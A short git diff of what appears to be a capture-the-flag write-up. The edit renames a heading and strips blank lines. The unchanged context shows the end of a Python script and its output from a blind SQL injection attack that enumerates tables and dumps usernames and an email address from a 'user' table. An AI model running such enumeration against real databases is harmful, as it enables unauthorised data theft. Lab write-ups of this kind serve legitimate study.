@@ -286,7 +286,7 @@ if __name__ == "__main__":
             readChars(data_length,column,table)
 ```
 
-- Flag result-:
+- Script result-:
 
 ```bash
 root@ubuntu:/tmp# ./try.py
@@ -299,7 +299,6 @@ root@ubuntu:/tmp# ./try.py
 [+] Table Found: login_attempt
 [+]Finding table Length
 [+] Table-Length:-:13
-
 [+] Table Found: login_session
 [+]Finding table Length
 [+] Table-Length:-:6
@@ -353,7 +352,6 @@ root@ubuntu:/tmp# ./try.py
 [+] Column username dumped::admin
 [+]Finding String Length
 [+] String-Length:-:14
-
 [+] Column username dumped::steve_and_alex
 [+]Finding String Length
 [+] String-Length:-:5
@@ -362,7 +360,6 @@ root@ubuntu:/tmp# ./try.py
 [+]Dumping String:table:user:column:user_email
 [+]Finding String Length
 [+] String-Length:-:15
-
 [+] Column user_email dumped::admin@admin.com
 [+]Finding String Length
 [+] String-Length:-:20
